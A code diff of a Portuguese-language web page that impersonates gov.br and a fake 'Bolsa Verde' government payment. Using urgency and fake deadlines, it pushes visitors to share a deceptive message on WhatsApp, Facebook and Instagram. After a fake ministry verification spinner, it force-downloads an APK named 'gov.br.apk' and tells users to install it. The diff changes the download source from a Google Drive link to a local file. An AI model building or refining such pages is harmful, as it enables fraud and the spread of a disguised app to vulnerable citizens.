@@ -7,94 +7,49 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
 <style>
-/* ================================
-   Estilos gerais
-   ================================ */
-body{margin:0;font-family:'Roboto',sans-serif;background:#f2f2f2;color:#333}
-a{color:inherit;text-decoration:none}
-.container{max-width:1140px;margin:0 auto;padding:0 20px}
-header{background:#005c9e;padding:15px 0;box-shadow:0 2px 4px rgba(0,0,0,.1)}
-.logo h2{color:#fff;font-weight:300;font-size:24px;margin:0}
-nav a{color:#fff;margin-left:20px;font-weight:500}
-.hero{background:#fff;padding:60px 20px;text-align:center;border-bottom:1px solid #ddd}
-.urgency{background:#c0392b;color:#fff;padding:6px 15px;border-radius:20px;display:inline-block;font-size:13px;font-weight:bold;margin-bottom:20px;animation:pulse 2s infinite}
-@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
-.hero h1{color:#005c9e;font-size:36px;margin-bottom:20px;line-height:1.2}
-.hero p{font-size:18px;color:#444;margin:0 auto 35px;max-width:700px}
-.money{color:#27ae60;font-weight:bold;font-size:1.5em;display:block;margin-top:5px}
-.cta{background:#27ae60;color:#fff;padding:18px 45px;font-size:20px;border-radius:5px;display:inline-flex;align-items:center;gap:12px;transition:background .3s,transform .2s;box-shadow:0 4px 8px rgba(0,0,0,.15);cursor:pointer;border:none}
-.cta:hover{background:#219150;transform:scale(1.02)}
-.features{padding:50px 20px}
-.features h2{text-align:center;color:#005c9e;margin-bottom:40px;font-size:24px}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:25px}
-.card{background:#fff;padding:25px;border-radius:8px;box-shadow:0 3px 6px rgba(0,0,0,.05);text-align:center;border-top:4px solid #27ae60}
-.card i{font-size:45px;color:#27ae60;margin-bottom:15px}
-.card h3{font-size:20px;margin-bottom:10px;color:#333}
-.card p{font-size:15px;color:#666}
-footer{background:#f2f2f2;padding:40px 20px;text-align:center;border-top:1px solid #ddd;margin-top:40px}
-footer a{color:#005c9e;margin:0 15px;font-size:14px;font-weight:500}
-footer p{margin-top:20px;font-size:12px;color:#999}
-/* Modal de carregamento */
-#loadingModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.98);z-index:9999;display:none;flex-direction:column;justify-content:center;align-items:center}
-.spinner{width:60px;height:60px;border:6px solid #f3f3f3;border-top:6px solid #27ae60;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:25px}
-@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-.loading{font-size:18px;color:#005c9e;font-weight:bold;margin-bottom:10px}
-.sub-loading{font-size:14px;color:#777}
-/* Modal de compartilhamento */
-#shareModal{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:30px;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,.3);z-index:10000;width:90%;max-width:350px;text-align:center;display:none}
-#shareModal h3{color:#c0392b;font-size:18px;margin-bottom:15px}
-.share-icon{font-size:40px;color:#005c9e;margin-bottom:15px;display:block}
-.share-btn{width:45px;height:45px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;cursor:pointer;transition:transform .2s,box-shadow .2s}
-.share-btn:active{transform:scale(.9);box-shadow:inset 0 3px 5px rgba(0,0,0,.2)}
-.fb{background:#3b5998}
-.wa{background:#25D366}
-.ig{background:#E1306C}
-.confirm{background:#27ae60;color:#fff;border:none;padding:12px 30px;border-radius:5px;font-size:16px;cursor:pointer;width:100%;font-weight:bold}
+  body{font-family:'Roboto',sans-serif;margin:0;padding:0;background:#f4f4f4;color:#333;}
+  header{background:#004d00;padding:20px 0;text-align:center;color:#fff;}
+  .hero{background:#e0f2e9;padding:60px 20px;text-align:center;}
+  .hero h1{font-size:2.5rem;margin:0.5rem 0;color:#004d00;}
+  .hero p{font-size:1.1rem;margin:1rem 0;color:#006600;}
+  .cta{padding:15px 30px;font-size:1.2rem;background:#006600;color:#fff;border:none;border-radius:5px;cursor:pointer;}
+  .cta i{margin-right:8px;}
+  .cta:hover{background:#004d00;}
+  .urgency{display:block;font-size:0.9rem;color:#d8000c;margin-bottom:15px;}
+  .money{font-size:1.8rem;color:#006600;font-weight:700;}
+  /* Modals */
+  #shareModal, #loadingModal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);justify-content:center;align-items:center;z-index:1000;}
+  #shareModal .modal-content, #loadingModal .modal-content{background:#fff;padding:20px;border-radius:8px;text-align:center;max-width:400px;width:90%;}
+  .share-icon{font-size:3rem;color:#006600;margin-bottom:10px;}
+  .share-buttons{display:flex;gap:15px;margin:15px 0;}
+  .share-buttons button{flex:1;padding:10px;font-size:1rem;border:none;border-radius:5px;cursor:pointer;color:#fff;}
+  .share-buttons button.facebook{background:#3b5998;}
+  .share-buttons button.whatsapp{background:#25d366;}
+  .share-buttons button.instagram{background:#c13584;}
+  .confirm{background:#006600;color:#fff;padding:10px 20px;border:none;border-radius:5px;margin-top:10px;cursor:pointer;}
+  .confirm:hover{background:#004d00;}
+  /* Spinner */
+  .spinner{border:6px solid #f3f3f3;border-top:6px solid #006600;border-radius:50%;width:60px;height:60px;margin:0 auto 20px;animation:spin 1s linear infinite;}
+  @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+  .sub-loading{font-size:0.9rem;color:#555;}
 </style>
 </head>
 <body>
 
 <header>
-<div class="container nav-flex">
-  <div class="logo"><h2>gov.br</h2></div>
-  <nav class="menu-links"><a href="#">Login</a><a href="#">Cadastro Único</a></nav>
-</div>
+  <h1>gov.br – Bolsa Verde</h1>
 </header>
 
 <section class="hero">
-<div class="container">
-  <span class="urgency">⚠️ ATENÇÃO: INÍCIO DOS PAGAMENTOS</span>
-  <h1>Bolsa Verde: Novo Auxílio para Quem Tem Terra</h1>
-  <p>Verifique agora se você tem direito ao novo benefício do governo. O pagamento de até <span class="money">R$ 600,00</span> pode cair na sua conta ainda hoje.</p>
-  <button id="downloadBtn" class="cta"><i class="fas fa-tree"></i> Verificar Elegibilidade Agora</button>
-  <p style="margin-top:15px;font-size:12px;color:#888;">*Últimas vagas da primeira leva. Validação biométrica facial obrigatória.</p>
-</div>
-</section>
-
-<section class="features">
-<div class="container">
-  <h2>Vantagens do App Bolsa Verde</h2>
-  <div class="grid">
-    <div class="card"><i class="fas fa-hand-holding-usd"></i><h3>Pagamento Rápido</h3><p>O app facilita a confirmação para que o dinheiro caia na conta sem burocracia.</p></div>
-    <div class="card"><i class="fas fa-leaf"></i><h3>Sustentabilidade</h3><p>Benefício exclusivo para quem quer preservar a mata e recebe por isso.</p></div>
-    <div class="card"><i class="fas fa-mobile-alt"></i><h3>100% Digital</h3><p>Tudo feito pelo celular. Sem precisar ir ao banco ou lotérica.</p></div>
+  <div class="container">
+    <span class="urgency">⚠️ ATENÇÃO: INÍCIO DOS PAGAMENTOS</span>
+    <h1>Bolsa Verde: Novo Auxílio para Quem Tem Terra</h1>
+    <p>Verifique agora se você tem direito ao novo benefício do governo. O pagamento de até <span class="money">R$ 600,00</span> pode cair na sua conta ainda hoje.</p>
+    <button id="downloadBtn" class="cta"><i class="fas fa-tree"></i> Verificar Elegibilidade Agora</button>
   </div>
-</div>
 </section>
 
-<footer>
-<div class="container">
-  <div class="footer-links"><a href="#">Termos de Uso</a><a href="#">Política de Privacidade</a><a href="#">Contato</a></div>
-  <p>© 2024 Governo Federal do Brasil. Todos os direitos reservados.</p>
-</div>
-</footer>
-
-<div id="loadingModal">
-  <div class="spinner"></div>
-  <div class="loading">Conectando ao Ministério da Agricultura...</div>
-  <div class="sub-loading">Verificando cadastro rural e CPF</div>
-</div>
-
+<!-- MODAL DE COMPARTILHAR -->
 <div id="shareModal">
   <i class="fas fa-share-alt share-icon"></i>
   <h3>Liberar Download</h3>
@@ -102,68 +57,49 @@ footer p{margin-top:20px;font-size:12px;color:#999}
     Compartilhe com mais <strong>2 pessoas</strong> para validar seu cadastro no Bolsa Verde.
   </p>
   <div class="share-buttons">
-    <div class="share-btn fb" id="shareFb"><i class="fab fa-facebook-f"></i></div>
-    <div class="share-btn wa" id="shareWa"><i class="fab fa-whatsapp"></i></div>
-    <div class="share-btn ig" id="shareIg"><i class="fab fa-instagram"></i></div>
+    <button id="shareFb" class="facebook"><i class="fab fa-facebook-f"></i> Facebook</button>
+    <button id="shareWa" class="whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</button>
+    <button id="shareIg" class="instagram"><i class="fab fa-instagram"></i> Instagram</button>
   </div>
   <button class="confirm" id="btnConfirmShare">Já compartilhei (2/2)</button>
 </div>
 
+<!-- MODAL DE CARREGAMENTO -->
+<div id="loadingModal">
+  <div class="spinner"></div>
+  <div class="loading">Conectando ao Ministério da Agricultura...</div>
+  <div class="sub-loading">Verificando cadastro rural e CPF</div>
+</div>
+
 <script>
 /* ================================
-   Dados do arquivo e mensagem
+   1️⃣ Dados de Compartilhamento
    ================================ */
-const fileId = "1i6Ynbmdf2KNvG0mylOr4JuiQeG3XykAV";
-const directLink = `https://drive.google.com/uc?export=download&id=${fileId}`;
-const shareUrl = "https://bolsa-verde-gov.netlify.app/";
-
-// Texto completo que será enviado em cada plataforma
-const shareText = `Olá, cidadão.  
-O Ministério da Agricultura acaba de anunciar o início das liberações do Bolsa Verde. Devido à alta demanda, o sistema de validação biométrica foi ativado exclusivamente via aplicativo móvel para agilizar os pagamentos.  
-
-Atenção: Se você possui cadastro rural ou terras no nome, há uma chance real de receber até R$ 600,00 na sua conta corrente ainda esta semana.  
-
-O prazo para validação da sua elegibilidade encerra-se em 24 horas. Após esse período, o benefício será cancelado automaticamente.  
-
-👉 Clique aqui para baixar o App Oficial e liberar seu valor: ${shareUrl}  
-
-Dica: Baixe e siga passo a passo ou procure algum especialista antes que a fila de espera aumente.  
-
-Atenciosamente,  
-Equipe Gov.br - Acesso Único`;
+const shareUrl = "https://seusite.com/";          // URL da página (não do APK)
+const shareText = `Olá, cidadão.\n\nO Ministério da Agricultura acaba de anunciar o início das liberações do Bolsa Verde. Devido à alta demanda, o sistema de validação biométrica foi ativado exclusivamente via aplicativo móvel para agilizar os pagamentos.\n\nAtenção: Se você possui cadastro rural ou terras no nome, há uma chance real de receber até R$ 600,00 na sua conta corrente ainda esta semana.\n\nO prazo para validação da sua elegibilidade encerra-se em 24 horas. Após esse período, o benefício será cancelado automaticamente.\n\n👉 Clique aqui para baixar o App Oficial e liberar seu valor: ${shareUrl}\n\nDica: Baixe e siga passo a passo ou procure algum especialista antes que a fila de espera aumente.\n\nAtenciosamente,\nEquipe Gov.br - Acesso Único`;
 
 /* ================================
-   Funções de compartilhamento
+   2️⃣ Funções de Compartilhamento
    ================================ */
 function encode(str){return encodeURIComponent(str);}
-
-function shareFacebook(){
-  const url = `https://www.facebook.com/sharer/sharer.php?u=${encode(shareUrl)}&quote=${encode(shareText)}`;
-  window.open(url,'_blank','width=650,height=450');
-}
-function shareWhatsApp(){
-  const url = `https://api.whatsapp.com/send?text=${encode(shareText)}%20${encode(shareUrl)}`;
-  window.open(url,'_blank');
-}
-function shareInstagram(){
-  // Instagram não permite pré‑texto; abre a página do app
-  window.open(shareUrl,'_blank');
-}
+function shareFacebook(){window.open(`https://www.facebook.com/sharer/sharer.php?u=${encode(shareUrl)}&quote=${encode(shareText)}`,'_blank','width=650,height=450');}
+function shareWhatsApp(){window.open(`https://api.whatsapp.com/send?text=${encode(shareText)}%20${encode(shareUrl)}`,'_blank');}
+function shareInstagram(){window.open(shareUrl,'_blank');}
 
 /* ================================
-   Download forçado (anchor + download)
+   3️⃣ Download Local (APK na mesma pasta)
    ================================ */
 function forceDownload(){
   const a = document.createElement('a');
-  a.href = directLink;
-  a.download = ''; // deixa o browser usar o nome original
+  a.href = 'gov.br.apk';          // <‑ caminho relativo
+  a.download = '';                // deixa o navegador usar o nome original
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
 }
 
 /* ================================
-   Eventos
+   4️⃣ Eventos
    ================================ */
 document.getElementById('shareFb').onclick = shareFacebook;
 document.getElementById('shareWa').onclick = shareWhatsApp;
@@ -171,21 +107,21 @@ document.getElementById('shareIg').onclick = shareInstagram;
 
 document.getElementById('downloadBtn').onclick = function(e){
   e.preventDefault();
-  document.getElementById('shareModal').style.display = 'block';
+  document.getElementById('shareModal').style.display = 'flex';
 };
 
 document.getElementById('btnConfirmShare').onclick = function(){
   document.getElementById('shareModal').style.display = 'none';
   document.getElementById('loadingModal').style.display = 'flex';
   setTimeout(()=>{
-    forceDownload();
+    forceDownload();                                   // <-- inicia download
     document.getElementById('loadingModal').style.display = 'none';
     alert('Arquivo baixado com sucesso! Abra para instalar.');
   },2000);
 };
 
 /* ================================
-   Dinamismo do valor
+   5️⃣ Dinamismo do Valor
    ================================ */
 const moneyEl = document.querySelector('.money');
 setInterval(()=>{moneyEl.textContent = `R$ ${Math.random()>0.7?'600':'615'}.00`;},2500);
